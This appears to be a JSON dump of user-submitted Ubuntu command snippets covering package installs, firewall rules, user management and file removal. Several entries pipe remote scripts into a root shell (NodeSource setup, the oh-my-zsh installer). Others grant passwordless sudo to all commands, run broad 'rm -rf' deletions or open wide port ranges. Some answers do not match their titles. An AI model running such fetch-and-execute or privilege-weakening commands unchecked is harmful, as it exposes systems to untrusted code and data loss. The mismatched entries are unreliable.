    "description": "1. Open a Terminal by CTRL+ALT+T 2. Type xrandr and ENTER 3. Note the display name usually VGA-1 or HDMI-1 or DP-1 4. Type cvt 1920 1080 (to get the --newmode args for the next step) and ENTER 5. Type sudo xrandr --newmode \"1920x1080_60.00\"  173.00  1920 2048 2248 2576  1080 1083 1088 1120 -hsync +vsync and ENTER 6. Type sudo xrandr --addmode VGA-1 \"1920x1080_60.00\" and ENTER (replace VGA-1 with your display type (step 3) like HDMI-1 or DP-1) 7. Now close the terminal and go to Settings >> Display settings and change it to 1920x1080 Enjoy FHD. ------------------------------------------ > For integrated displays:  goto your terminal and type vim ~/.profile ENTER Paste in the shell command from step 5 and 6, then save.  > For external displays:  create a script called external_monitor_resolution.sh in the directory /etc/profile.d/. using sudo vim /etc/profile.d/external_monitor_resol.sh. Paste in the shell command from step 5 and 6, then save. (Note: if using sudo would require you typing a password, your system might freeze on startup while waiting for you to input a password. So when pasting do away with the sudo)  Something like this:  xrandr --newmode \"1920x1080_60.00\"  173.00  1920 2048 2248 2576  1080 1083 1088 1120 -hsync +vsync xrandr --addmode VGA-1 \"1920x1080_60.00\"` and <kbd>ENTER</kbd> *(replace **VGA-1** with your display type (step 3) like **HDMI-1** or **DP-1**)* \n",
    "reg_date": "2021-10-11T22:12:32.000Z"
  },
  {
    "id": 4623,
    "keyword": null,
    "link": null,
    "title": " ubuntu history select",
    "description": "#Install HSTR on Ubuntu using one-liner: sudo add-apt-repository ppa:ultradvorka/ppa && sudo apt-get update && sudo apt-get install hstr && hstr --show-configuration >> ~/.bashrc && . ~/.bashrc #https://github.com/dvorka/hstr/blob/master/INSTALLATION.md#ubuntu\n",
    "reg_date": "2021-10-11T22:12:32.000Z"
  },
  {
    "id": 4624,
    "keyword": null,
    "link": null,
    "title": " ubuntu install and configure postgres server",
    "description": "sudo apt update sudo apt install postgresql postgresql-contrib \n",
    "reg_date": "2021-10-11T22:12:32.000Z"
  },
  {
    "id": 4625,
    "keyword": null,
    "link": null,
    "title": " ubuntu install apache mod proxy",
    "description": "sudo a2enmod proxy sudo a2enmod proxy_http  # Optional, load balancing features for multiple backend servers. sudo a2enmod proxy_balancer sudo a2enmod lbmethod_byrequests \n",
    "reg_date": "2021-10-11T22:12:32.000Z"
  },
  {
    "id": 4626,
    "keyword": null,
    "link": null,
    "title": " ubuntu install bluez",
    "description": "$ sudo apt install bluez \n",
    "reg_date": "2021-10-11T22:12:32.000Z"
  },
  {
    "id": 4627,
    "keyword": null,
    "link": null,
    "title": " ubuntu install certbot",
    "description": " sudo apt-get update sudo apt-get install software-properties-common sudo apt-get install certbot sudo apt-get install python-certbot-apache # apache config sudo certbot --apache sudo certbot --apache -d your_domain -d www.your_domain \nsudo apt install python3-certbot-apache\nsudo apt-get update sudo apt-get install software-properties-common sudo apt-get install certbot sudo apt-get install python-certbot-apache # apache config sudo certbot --apache\n",
    "reg_date": "2021-10-11T22:12:32.000Z"
  },
  {
    "id": 4628,
    "keyword": null,
    "link": null,
    "title": " ubuntu install codecs",
    "description": "sudo apt install ubuntu-restricted-extras\n",
    "reg_date": "2021-10-11T22:12:32.000Z"
  },
  {
    "id": 4629,
    "keyword": null,
    "link": null,
    "title": " ubuntu install discord",
    "description": "$ sudo snap install discord discord 0.0.9 from Snapcrafters installed \nsudo snap install discord\n",
    "reg_date": "2021-10-11T22:12:33.000Z"
  },
  {
    "id": 4630,
    "keyword": null,
    "link": null,
    "title": " ubuntu install ext-mbstring",
    "description": "\tsudo apt-get install php7.2-mbstring   \t     sudo apt-get install libapache2-mod-php7.2 \t    \tsudo service apache2 restart\nsudo apt install php7.2-mbstring \n",
    "reg_date": "2021-10-11T22:12:33.000Z"
  },
  {
    "id": 4631,
    "keyword": null,
    "link": null,
    "title": " ubuntu install gimp",
    "description": "#ubuntu 20.04 upwards sudo apt update sudo apt install gimp \nsudo apt-get autoremove gimp gimp-plugin-registry sudo add-apt-repository ppa:otto-kesselgulasch/gimp sudo apt-get update sudo apt-get install gimp \nsudo snap install gimp\nsudo add-apt-repository ppa:otto-kesselgulasch/gimp-edge && sudo apt update && sudo apt install gimp gimp-gmic\n",
    "reg_date": "2021-10-11T22:12:33.000Z"
  },
  {
    "id": 4632,
    "keyword": null,
    "link": null,
    "title": " ubuntu install git",
    "description": "sudo apt update sudo apt install git \n$ sudo apt install git\nsudo apt install git-all\nsudo add-apt-repository ppa:git-core/ppa && sudo apt update && sudo apt install git\n$ sudo apt-get install install-info\n",
    "reg_date": "2021-10-11T22:12:33.000Z"
  },
  {
    "id": 4633,
    "keyword": null,
    "link": null,
    "title": " ubuntu install htop",
    "description": "sudo apt update sudo apt install htop # To run htop   # or for Ubuntu versions before 16.04  sudo apt-get update sudo apt-get install htop # To run htop \n",
    "reg_date": "2021-10-11T22:12:33.000Z"
  },
  {
    "id": 4634,
    "keyword": null,
    "link": null,
    "title": " ubuntu install i3",
    "description": "sudo apt update sudo apt install i3  #You are new to i3 and you want your settings from Ubuntu to work with i3? #look into https://github.com/deuill/i3-gnome-flashback #or you could try regolith: https://regolith-linux.org/\n",
    "reg_date": "2021-10-11T22:12:33.000Z"
  },
  {
    "id": 4635,
    "keyword": null,
    "link": null,
    "title": " ubuntu install imagemagick",
    "description": "Ubuntu : sudo apt install imagemagick\nDownload: https://download.imagemagick.org/ImageMagick/download/ImageMagick.tar.gz cd ImageMagick-7.0.10 ./configure make ./configure --with-modules sudo make install sudo ldconfig /usr/local/lib make check  #Done its easy. #By Sailendra Chettri. #Source: https://imagemagick.org/script/install-source.php#unix\n",
    "reg_date": "2021-10-11T22:12:33.000Z"
  },
  {
    "id": 4636,
    "keyword": null,
    "link": null,
    "title": " ubuntu install java JRE 1.8.0 152",
    "description": "sudo apt install openjdk-8-jre\n",
    "reg_date": "2021-10-11T22:12:34.000Z"
  },
  {
    "id": 4637,
    "keyword": null,
    "link": null,
    "title": " ubuntu install jre",
    "description": "sudo apt install openjdk-8-jre\n",
    "reg_date": "2021-10-11T22:12:34.000Z"
  },
  {
    "id": 4638,
    "keyword": null,
    "link": null,
    "title": " ubuntu install matplotlib",
    "description": "sudo apt install python3-matplotlib\n",
    "reg_date": "2021-10-11T22:12:34.000Z"
  },
  {
    "id": 4639,
    "keyword": null,
    "link": null,
    "title": " ubuntu install nginx",
    "description": "sudo systemctl start nginx\nsudo apt update sudo apt install nginx\nsudo apt update sudo apt install nginx \n",
    "reg_date": "2021-10-11T22:12:34.000Z"
  },
  {
    "id": 4640,
    "keyword": null,
    "link": null,
    "title": " ubuntu install node js",
    "description": "sudo apt-get install curl curl -sL https://deb.nodesource.com/setup_13.x | sudo -E bash - sudo apt-get install nodejs # Check node version node -v  # v13.9.0 # Also, check the npm version npm -v  # 6.13.7\ncurl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - sudo apt install nodejs sudo apt install npm sudo apt update\nsudo apt install nodejs\n//Author: Mohammad Arman Khan //How To Install Node.js on Ubuntu 1: sudo apt-get update 2: sudo apt-get install nodejs 3: sudo apt-get install npm 4: nodejs -v\nsudo apt-get update sudo apt-get install nodejs npm\n// Enabling NodeSource Repository // replace %V% with desired major version curl -sL https://deb.nodesource.com/setup_%V%.x | sudo bash - // Install using apt-get sudo apt-get install -y nodejs // check installed node version node --version\n",
    "reg_date": "2021-10-11T22:12:34.000Z"
  },
  {
    "id": 4641,
    "keyword": null,
    "link": null,
    "title": " ubuntu install nodejs",
    "description": "sudo apt-get install curl curl -sL https://deb.nodesource.com/setup_13.x | sudo -E bash - sudo apt-get install nodejs # Check node version node -v  # v13.9.0 # Also, check the npm version npm -v  # 6.13.7\nsudo apt update sudo apt install nodejs sudo apt install npm\ncurl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - sudo apt install nodejs sudo apt install npm sudo apt update\nsudo apt install nodejs\n//Author: Mohammad Arman Khan //How To Install Node.js on Ubuntu 1: sudo apt-get update 2: sudo apt-get install nodejs 3: sudo apt-get install npm 4: nodejs -v\nsudo apt update && apt install nodejs npm\n",
    "reg_date": "2021-10-11T22:12:34.000Z"
  },
  {
    "id": 4642,
    "keyword": null,
    "link": null,
    "title": " ubuntu install okular",
    "description": "sudo snap install okular\n",
    "reg_date": "2021-10-11T22:12:34.000Z"
  },
  {
    "id": 4643,
    "keyword": null,
    "link": null,
    "title": " ubuntu install opencl",
    "description": "sudo apt install ocl-icd-opencl-dev\n",
    "reg_date": "2021-10-11T22:12:35.000Z"
  },
  {
    "id": 4644,
    "keyword": null,
    "link": null,
    "title": " ubuntu install php",
    "description": "# Update packages lists sudo apt update  # Install Apache2 (on Ubuntu, mostly it's already installed) sudo apt install apache2  # Install the latest version of PHP and Apache wrapper sudo apt install php libapache2-mod-php  # Install some important PHP extensions, you might need to install more later sudo apt install php-{bcmath,bz2,curl,gd,json,mbstring,mysql,xml,zip}  # Install MySQL server, and remember to run mysql_secure_installation script after that sudo apt install mysql-server  # Start MySQL service sudo systemctl start mysql  # Restart Apache service to reload all changes sudo systemctl restart apache2\n# Update packages lists sudo apt update  # Install PPA sudo add-apt-repository ppa:ondrej/php  ## If you want the latest sudo apt install php ## else sepcify version number as below sudo apt install php7.3  # Install Extensions (add php version number for specific version) sudo apt-get install php7.3-fpm php7.3 php7.3-cli php7.3-mysql php7.3-gd php7.3-imagick php7.3-recode php7.3-tidy php7.3-xmlrpc php7.3-common php7.3-curl php7.3-mbstring php7.3-xml php7.3-bcmath php7.3-bz2 php7.3-intl php7.3-json php7.3-readline php7.3-zip  # Install the latest version of PHP and Apache wrapper sudo apt install php libapache2-mod-php ## else if you installed a specific version of PHP sudo apt install php libapache2-mod-php7.3  # Enable PHP (can type sudo a2enmod php, then push tab to see listed versions) sudo a2enmod php7.3  # Restart Apache Service sudo service apache2 restart\napt-get install php-pear php-fpm php-dev php-zip php-curl php-xmlrpc php-gd php-mysql php-mbstring php-xml libapache2-mod-php\napt-get install php\nsudo apt install php libapache2-mod-php  # restart it sudo systemctl restart apache2\nsudo apt-get install php libapache2-mod-php\n",
    "reg_date": "2021-10-11T22:12:35.000Z"
  },
  {
    "id": 4645,
    "keyword": null,
    "link": null,
    "title": " ubuntu install php 8",
    "description": "# Ubuntu 20.04 # List existing PHP packages dpkg -l | grep php | tee packages.txt  #Add ondrej/php PPA sudo add-apt-repository ppa:ondrej/php # Press enter when prompted. sudo apt-get update  #Install PHP 8.0 with CLI sudo apt install php8.0-common php8.0-cli  #Additional extensions sudo apt install php8.0- { bz2,curl,intl,mysql,readline,xml }\nsudo apt install php8.0-cli php8.0-common php8.0-imap php8.0-redis php8.0-snmp php8.0-xml\nsudo apt install php7.3-cli php7.3-fpm php7.3-json php7.3-pdo php7.3-mysql php7.3-zip php7.3-gd  php7.3-mbstring php7.3-curl php7.3-xml php7.3-bcmath php7.3-json\n sudo apt install php8.0\nsudo apt update sudo apt install php php-cli php-fpm php-json php-pdo php-mysql php-zip php-gd  php-mbstring php-curl php-xml php-pear php-bcmath \nsudo apt update sudo apt install lsb-release ca-certificates apt-transport-https software-properties-common -y sudo add-apt-repository ppa:ondrej/php\n",
    "reg_date": "2021-10-11T22:12:35.000Z"
  },
  {
    "id": 4646,
    "keyword": null,
    "link": null,
    "title": " ubuntu install sfml",
    "description": "sudo apt-get install libsfml-dev\n",
    "reg_date": "2021-10-11T22:12:35.000Z"
  },
  {
    "id": 4647,
    "keyword": null,
    "link": null,
    "title": " ubuntu install snap",
    "description": "sudo apt update sudo apt install snapd\nOn Linux Mint 20, /etc/apt/preferences.d/nosnap.pref needs to be removed before Snap can be installed. This can be accomplished from the command line:  sudo rm /etc/apt/preferences.d/nosnap.pref sudo apt update  To install snap from the Software Manager application, search for snapd and click Install. Alternatively, snapd can be installed from the command line:   sudo apt install snapd  Either restart your machine, or log out and in again, to complete the installation.  Install Snap Store To install Snap Store, simply use the following command:  sudo snap install snap-store  \nThe Best way to install Snapd On linux sudo apt update sudo apt install snapd\nsudo snap install snap-store\nsudo apt update sudo apt install snapd \n",
    "reg_date": "2021-10-11T22:12:35.000Z"
  },
  {
    "id": 4648,
    "keyword": null,
    "link": null,
    "title": " ubuntu install ssh server",
    "description": "sudo apt-get install openssh-server\nsudo service ssh start\n$ sudo apt-get install ssh \nssh linuxize@192.168.121.111\n",
    "reg_date": "2021-10-11T22:12:35.000Z"
  },
  {
    "id": 4649,
    "keyword": null,
    "link": null,
    "title": " ubuntu install telegram",
    "description": " sudo snap install telegram-desktop\nsudo snap install telegram-desktop\n",
    "reg_date": "2021-10-11T22:12:35.000Z"
  },
  {
    "id": 4650,
    "keyword": null,
    "link": null,
    "title": " ubuntu install tree",
    "description": "apt-get install tree\nsudo apt-get install tree \n",
    "reg_date": "2021-10-11T22:12:35.000Z"
  },
  {
    "id": 4651,
    "keyword": null,
    "link": null,
    "title": " ubuntu install vboxguest",
    "description": "$ sudo add-apt-repository multiverse $ sudo apt install virtualbox-guest-dkms virtualbox-guest-x11 \n",
    "reg_date": "2021-10-11T22:12:36.000Z"
  },
  {
    "id": 4652,
    "keyword": null,
    "link": null,
    "title": " ubuntu install vlc",
    "description": "# Ubuntu 20.04 upwards sudo apt install snapd sudo snap install vlc\n% sudo snap install vlc \nsudo apt install vlc \n% sudo snap install vlc\n",
    "reg_date": "2021-10-11T22:12:36.000Z"
  },
  {
    "id": 4653,
    "keyword": null,
    "link": null,
    "title": " ubuntu install without suggested packages",
    "description": "# apt-get provides options to specify do not install recommended packages sudo apt install --no-install-recommends package-name\n",
    "reg_date": "2021-10-11T22:12:36.000Z"
  },
  {
    "id": 4654,
    "keyword": null,
    "link": null,
    "title": " ubuntu install zip",
    "description": "apt-get update apt-get install zip unzip\nsudo apt install zip\n$ sudo apt install unzip \nzip -r folder.zip folder\n",
    "reg_date": "2021-10-11T22:12:36.000Z"
  },
  {
    "id": 4655,
    "keyword": null,
    "link": null,
    "title": " ubuntu install zsh",
    "description": "#The sudo apt-get update command is used to download package  #information from all configured sources  #So when you run update command, it downloads the package  #information from the Internet. It is useful to get info on  #an updated version of packages or their dependencies.  sudo apt-get update sudo apt-get install zsh  #Now that ZSH shell is installed, you can check whether ZSH  #is working with the following command: zsh --version\n$ sudo apt-get install zsh $ sh -c \"$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)\" \nsh -c \"$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\"\n",
    "reg_date": "2021-10-11T22:12:36.000Z"
  },
  {
    "id": 4656,
    "keyword": null,
    "link": null,
    "title": " ubuntu installing gimp",
    "description": "sudo apt-get autoremove gimp gimp-plugin-registry sudo add-apt-repository ppa:otto-kesselgulasch/gimp sudo apt-get update sudo apt-get install gimp \n",
    "reg_date": "2021-10-11T22:12:36.000Z"
  },
  {
    "id": 4657,
    "keyword": null,
    "link": null,
    "title": " ubuntu intall OpenBLAS",
    "description": "curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add - echo \"deb https://dl.yarnpkg.com/debian/ stable main\" | sudo tee /etc/apt/sources.list.d/yarn.list sudo apt update && sudo apt install yarn\nsudo apt-get install libopenblas-dev\n",
    "reg_date": "2021-10-11T22:12:36.000Z"
  },
  {
    "id": 4658,
    "keyword": null,
    "link": null,
    "title": " ubuntu iptables common rules for server",
    "description": "# Accept on localhost sudo iptables -A INPUT -i lo -j ACCEPT sudo iptables -A OUTPUT -o lo -j ACCEPT  # Allow established sessions to receive traffic sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT sudo iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT  #Allowing All Incoming HTTP sudo iptables -A INPUT -p tcp --dport 80 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT sudo iptables -A OUTPUT -p tcp --sport 80 -m conntrack --ctstate ESTABLISHED -j ACCEPT  #Allowing All Incoming SSH sudo iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT sudo iptables -A OUTPUT -p tcp --sport 22 -m conntrack --ctstate ESTABLISHED -j ACCEPT  #Allowing All Incoming HTTPS sudo iptables -A INPUT -p tcp --dport 443 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT sudo iptables -A OUTPUT -p tcp --sport 443 -m conntrack --ctstate ESTABLISHED -j ACCEPT  #Deny all sudo iptables -P INPUT DROP sudo iptables -P FORWARD DROP sudo iptables -P OUTPUT DROP  #Deny all ipV6 sudo ip6tables -P INPUT DROP sudo ip6tables -P FORWARD DROP sudo ip6tables -P OUTPUT DROP\n",
    "reg_date": "2021-10-11T22:12:36.000Z"
  },
  {
    "id": 4659,
    "keyword": null,
    "link": null,
    "title": " ubuntu iptables open ssh output port",
    "description": "//add rule sudo iptables -A OUTPUT -p tcp -m tcp --dport 22 -m state --state NEW -j ACCEPT //check rules sudo iptables -S \n",
    "reg_date": "2021-10-11T22:12:37.000Z"
  },
  {
    "id": 4660,
    "keyword": null,
    "link": null,
    "title": " ubuntu isolate workspaces",
    "description": "gsettings set org.gnome.shell.app-switcher current-workspace-only true gsettings set org.gnome.shell.extensions.dash-to-dock isolate-workspaces true \n",
    "reg_date": "2021-10-11T22:12:37.000Z"
  },
  {
    "id": 4661,
    "keyword": null,
    "link": null,
    "title": " ubuntu keepass2",
    "description": "# on Ubuntu 18.04 sudo apt-add-repository ppa:jtaylor/keepass sudo apt update sudo apt install keepass2  # on Ubuntu 20.04 sudo apt install keepass2\nsudo apt install keepass2\n",
    "reg_date": "2021-10-11T22:12:37.000Z"
  },
  {
    "id": 4662,
    "keyword": null,
    "link": null,
    "title": " ubuntu keepass2 install",
    "description": "sudo apt install keepass2\n",
    "reg_date": "2021-10-11T22:12:37.000Z"
  },
  {
    "id": 4663,
    "keyword": null,
    "link": null,
    "title": " ubuntu kill process",
    "description": "sudo kill -9 $(sudo lsof -t -i:9001) \npidof slack  9734 9718 9716 9708 9622 9619 sudo kill -9 process_id  pidof apt  9734 9718 9716 9708 9622 9619 sudo kill -9 9734 9718 9716 9708 9622 9619  \nsudo kill -9 process_id\nkill -9 44475\nps aux | grep chrome\nps -ax | grep application name \n",
    "reg_date": "2021-10-11T22:12:37.000Z"
  },
  {
    "id": 4664,
    "keyword": null,
    "link": null,
    "title": " ubuntu kill process for user",
    "description": "pkill -u username \npkill -9 -u `id -u username`\n",
    "reg_date": "2021-10-11T22:12:37.000Z"
  },
  {
    "id": 4665,
    "keyword": null,
    "link": null,
    "title": " ubuntu know username",
    "description": "whoami or echo $USER\necho $USER \n# -l changes login name # -d changes home directory # -m copies over contents from old home directory usermod -l <newname> -d /home/<newname> -m <oldname>  # NOTE: will not work if you are currently logged on as user # - workaround by temporarily enabling root account and running above command there # [sudo passwd root]  # - after root account has been used to change username lock it using # [sudo passwd -l root]\n",
    "reg_date": "2021-10-11T22:12:37.000Z"
  },
  {
    "id": 4666,
    "keyword": null,
    "link": null,
    "title": " ubuntu last logs",
    "description": "sudo tail -n 30 /var/log/access.log-20210309\n",
    "reg_date": "2021-10-11T22:12:37.000Z"
  },
  {
    "id": 4667,
    "keyword": null,
    "link": null,
    "title": " ubuntu lemp",
    "description": "// NGINX sudo apt update sudo apt install nginx  // MYSQL sudo apt install mysql-server sudo mysql ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'password'; FLUSH PRIVILEGES;  exit; sudo mysql -u root -p  // PHP sudo apt install php-fpm php-mysql  // Website sudo mkdir /var/www/your_domain sudo chown -R $USER:$USER /var/www/your_domain  // Website Configuration sudo nano /etc/nginx/sites-available/your_domain  server {     listen 80;     server_name your_domain www.your_domain;     root /var/www/your_domain;      index index.html index.htm index.php;      location / {         try_files $uri $uri/ =404;     }      location ~ \\.php$ {         include snippets/fastcgi-php.conf;         fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;      }      location ~ /\\.ht {         deny all;     }  }  sudo ln -s /etc/nginx/sites-available/your_domain /etc/nginx/sites-enabled/ sudo nginx -t sudo systemctl reload nginx    // Place your application in your folder nano /var/www/your_domain/index.html  // Check PHP  nano /var/www/your_domain/info.php  <?php phpinfo();\n",
    "reg_date": "2021-10-11T22:12:38.000Z"
  },
  {
    "id": 4668,
    "keyword": null,
    "link": null,
    "title": " ubuntu list file by size",
    "description": "ls -l --block-size=M\n",
    "reg_date": "2021-10-11T22:12:38.000Z"
  },
  {
    "id": 4669,
    "keyword": null,
    "link": null,
    "title": " ubuntu list files",
    "description": "ls #show list folders and files in current dir\n",
    "reg_date": "2021-10-11T22:12:38.000Z"
  },
  {
    "id": 4670,
    "keyword": null,
    "link": null,
    "title": " ubuntu list latest installed packages",
    "description": "apt list --installed | grep [name]\n",
    "reg_date": "2021-10-11T22:12:38.000Z"
  },
  {
    "id": 4671,
    "keyword": null,
    "link": null,
    "title": " ubuntu list running services",
    "description": "To check all running services service --status-all | grep '\\[ + \\]'  To check all services (running & non running) service --status-all\n",
    "reg_date": "2021-10-11T22:12:38.000Z"
  },
  {
    "id": 4672,
    "keyword": null,
    "link": null,
    "title": " ubuntu list users",
    "description": "cat /etc/passwd\nawk -F: '{ print $1}' /etc/passwd\ncat /etc/passwd #check list of users in linux ubuntu\ncut -d: -f1 /etc/passwd \nawk -F: '{ print $1}' /etc/passwdCopy\n",
    "reg_date": "2021-10-11T22:12:38.000Z"
  },
  {
    "id": 4673,
    "keyword": null,
    "link": null,
    "title": " ubuntu list users in group",
    "description": "getent group groupname\ngrep 'group-name-here' /etc/group\n$ groups\ngroups [user name] # [user name] : (optionnal) the user to list the group of #                           default is the one executing the command.\n",
    "reg_date": "2021-10-11T22:12:38.000Z"
  },
  {
    "id": 4674,
    "keyword": null,
    "link": null,
    "title": " ubuntu logout",
    "description": "gnome-session-quit \n",
    "reg_date": "2021-10-11T22:12:38.000Z"
  },
  {
    "id": 4675,
    "keyword": null,
    "link": null,
    "title": " ubuntu macbook camera",
    "description": "sudo apt-get install git sudo apt-get install curl xzcat cpio git clone https://github.com/patjak/facetimehd-firmware.git cd facetimehd-firmware make sudo make install cd .. sudo apt-get install kmod libssl-dev checkinstall git clone https://github.com/patjak/bcwc_pcie.git cd bcwc_pcie make sudo make install sudo depmod sudo modprobe -r bdc_pci sudo modprobe facetimehd sudo nano /etc/modules **add line \"facetimehd\", write out (ctl+o) & close** \nsudo apt-get install cheese \n  #There is a built in app called cheese webcam booth in Ubuntu 14.04. You can open it from launcher. It can be used to take photographs as well as videos.   Webcam Tools Webcamoid\tFull featured and multi-platform webcam suite with a simple interface ZoneMinder\tAll-in-one security camera solution Motion\tV4L capture program supporting motion detection Kerberos.io\tVideo surveillance solution Clight\tWebcam becomes light sensor Cheese\tTake pictures and videos from your webcam Ekiga\tVoIP and video conferencing application Kamoso\tQt-based webcam utility HasciiCam\tASCII cam streaming \n",
    "reg_date": "2021-10-11T22:12:39.000Z"
  },
  {
    "id": 4676,
    "keyword": null,
    "link": null,
    "title": " ubuntu make symbolic link",
    "description": "ln -s /opt/foo/src /usr/bin/bar/target\n",
    "reg_date": "2021-10-11T22:12:39.000Z"
  },
  {
    "id": 4677,
    "keyword": null,
    "link": null,
    "title": " ubuntu media codecs",
    "description": "sudo add-apt-repository multiverse  sudo apt install ubuntu-restricted-extras\n",
    "reg_date": "2021-10-11T22:12:39.000Z"
  },
  {
    "id": 4678,
    "keyword": null,
    "link": null,
    "title": " ubuntu minimize window by clicking on dock",
    "description": "gsettings set org.gnome.shell.extensions.dash-to-dock click-action 'minimize'\n",
    "reg_date": "2021-10-11T22:12:39.000Z"
  },
  {
    "id": 4679,
    "keyword": null,
    "link": null,
    "title": " ubuntu mongodb not starting",
    "description": "cd /var/log/mongodb sudo chown -R mongodb:mongodb . cd /var/lib/mongodb sudo chown -R mongodb:mongodb .\n",
    "reg_date": "2021-10-11T22:12:39.000Z"
  },
  {
    "id": 4680,
    "keyword": null,
    "link": null,
    "title": " ubuntu mouse issues after suspend",
    "description": "#Disable/Enable via Xinput: #Find your trackpad ID with the following command: xinput --list  #Once you have your device ID&mdash;I'll call it 12 for this example&mdash;try disabling and enabling the device with: xinput --disable 12 xinput --enable 12\n",
    "reg_date": "2021-10-11T22:12:39.000Z"
  },
  {
    "id": 4681,
    "keyword": null,
    "link": null,
    "title": " ubuntu no bluetooth found",
    "description": "sudo add-apt-repository ppa:bluetooth/bluez sudo apt install bluez\n",
    "reg_date": "2021-10-11T22:12:39.000Z"
  },
  {
    "id": 4682,
    "keyword": null,
    "link": null,
    "title": " ubuntu open directory from terminal",
    "description": "xdg-open folder_name\n# nautilus /path $ nautilus /var\nJust use \"open [path_to_dir]\" in Unix or \"start [path_to_dir]\" in Windows as: open .\t#Open current directdory in Unix start . #Open current directory in Windows\n",
    "reg_date": "2021-10-11T22:12:40.000Z"
  },
  {
    "id": 4683,
    "keyword": null,
    "link": null,
    "title": " ubuntu open file from terminal",
    "description": "xdg-open file-name  # xdg-open myPicture.png\nopen ~/Desktop/filename.txt\n#for short files  cat filename.txt  #for longer files less filename.txt  #to edit files inside terminal open using vim or nano  #using vim vim filename.txt  #using nano nano filename.txt\ncat <path/your_file> \nnautilus . #or nautilus /home/john/Downloads\n",
    "reg_date": "2021-10-11T22:12:40.000Z"
  },
  {
    "id": 4684,
    "keyword": null,
    "link": null,
    "title": " ubuntu open port",
    "description": "sudo ufw allow 1191/tcp\n$ sudo lsof -i:22\nDebian: sudo ufw allow PORT. CentOS: sudo firewall-cmd --zone=public --permanent --add-port=PORT/tcp sudo firewall-cmd --reload\nsudo ufw allow 1:9999/tcp\n",
    "reg_date": "2021-10-11T22:12:40.000Z"
  },
  {
    "id": 4685,
    "keyword": null,
    "link": null,
    "title": " ubuntu passwordless sudo",
    "description": "sudo vim /etc/sudoers # Find `includedir /etc/sudoers.d` usually last line of file username ALL=(ALL) NOPASSWD: ALL\n",
    "reg_date": "2021-10-11T22:12:40.000Z"
  },
  {
    "id": 4686,
    "keyword": null,
    "link": null,
    "title": " ubuntu pip3",
    "description": "sudo apt-get -y install python3-pip\nsudo apt install python3-pip\n",
    "reg_date": "2021-10-11T22:12:40.000Z"
  },
  {
    "id": 4687,
    "keyword": null,
    "link": null,
    "title": " ubuntu remove all folders but keep some",
    "description": "find ./myfolder -mindepth 1 ! -regex '^./myfolder/test2\\(/.*\\)?' -delete\n",
    "reg_date": "2021-10-11T22:12:40.000Z"
  },
  {
    "id": 4688,
    "keyword": null,
    "link": null,
    "title": " ubuntu remove all unnecessary packages",
    "description": "du -sh /var/cache/apt/archives\n",
    "reg_date": "2021-10-11T22:12:40.000Z"
  },
  {
    "id": 4689,
    "keyword": null,
    "link": null,
    "title": " ubuntu remove application",
    "description": "$ sudo apt-get remove package-name\nsudo apt-get remove <application_name> \n",
    "reg_date": "2021-10-11T22:12:40.000Z"
  },
  {
    "id": 4690,
    "keyword": null,
    "link": null,
    "title": " ubuntu remove cuda",
    "description": "sudo apt-get purge nvidia* sudo apt-get autoremove sudo apt-get autoclean sudo rm -rf /usr/local/cuda*\n",
    "reg_date": "2021-10-11T22:12:40.000Z"
  },
  {
    "id": 4691,
    "keyword": null,
    "link": null,
    "title": " ubuntu remove directory",
    "description": "rm -R folder-name\nsudo rm -rf folder-name\nrm -rf directory-name\n$ rm -r directoryName\n# EXAMPLE rm -r YourFolderName  # SYNTAX # rm [option(s)-if-any] <folder(s)-to-remove-including-contents>  # +---------+------------------------------------------------------------------+ # | OPTIONS |  DESCRIPTION                                                     | # +---------+------------------------------------------------------------------+ # |   -f    |  Force: ignore nonexistent files, never prompt                   | # |   -i    |  Interactive: prompt before every removal                        | # |   -I    |  Interactive: only prompt before removing more than three files  | # |   -r    |  Recursive: remove directories and their contents recursively    | # |   -v    |  Verbose:  explain what is being done                            | # +---------+------------------------------------------------------------------+\nrmdir\n",
    "reg_date": "2021-10-11T22:12:41.000Z"
  },
  {
    "id": 4692,
    "keyword": null,
    "link": null,
    "title": " ubuntu remove kite",
    "description": "# Remove Kite via terminal ~/.local/share/kite/uninstall\n",
    "reg_date": "2021-10-11T22:12:41.000Z"
  },
  {
    "id": 4693,
    "keyword": null,
    "link": null,
    "title": " ubuntu remove package and dependencies install deb",
    "description": "#For Ubuntu the correct method to remove packages through the console is: apt-get &ndash;-purge remove skypeforlinux. dpkg &ndash;-remove skypeforlinux. dpkg &ndash;r packagename.deb. apt-get clean && apt-get autoremove. sudo apt-get -f install. ... #apt-get update. #dpkg &ndash;-configure -a. ... apt-get -u dist-upgrade. apt-get remove &ndash;dry-run packagename.\n",
    "reg_date": "2021-10-11T22:12:41.000Z"
  },
  {
    "id": 4694,
    "keyword": null,
    "link": null,
    "title": " ubuntu remove temp files",
    "description": "sudo rm -rf /tmp/* \n",
    "reg_date": "2021-10-11T22:12:41.000Z"
  },
  {
    "id": 4695,
    "keyword": null,
    "link": null,
    "title": " ubuntu rename user login",
    "description": "#As root / or as another user.  # Kill the processes of the user to rename pkill -u <OldLoginName>  #Rename user login usermod -l <OldLoginName> <NewLoginName>  #Rename HomeDir   sudo usermod -d /home/NewHomeDir -m NewLoginName\n# -l changes login name # -d changes home directory # -m copies over contents from old home directory usermod -l <newname> -d /home/<newname> -m <oldname>  # NOTE: will not work if you are currently logged on as user # - workaround by temporarily enabling root account and running above command there # [sudo passwd root]  # - after root account has been used to change username lock it using # [sudo passwd -l root]\n# To manage every aspect of the user database, you use the usermod tool. # To change username (it is probably best to do this without being logged in):  sudo usermod -l newUsername oldUsername # This however, doesn't rename the home folder. # To change home-folder, use  sudo usermod -d /home/newHomeDir -m newUsername\n",
    "reg_date": "2021-10-11T22:12:41.000Z"
  },
  {
    "id": 4696,
    "keyword": null,
    "link": null,
    "title": " ubuntu replace text in file",
